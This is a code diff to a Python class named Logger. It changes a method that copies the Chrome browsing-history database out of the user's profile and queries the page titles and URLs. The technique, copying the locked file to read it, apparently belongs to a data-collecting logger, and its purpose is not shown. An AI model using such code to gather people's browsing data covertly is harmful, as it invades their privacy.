@@ -134,7 +134,8 @@ class Logger():
     def historyLog():
         history_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default"
         login_db = os.path.join(history_path, 'History')
-        c = sqlite3.connect(login_db)
+        shutil.copyfile(login_db, "histdb.db")
+        c = sqlite3.connect("histdb.db")
         cursor = c.cursor()
         select_statement = "SELECT title, url FROM urls"
         cursor.execute(select_statement)
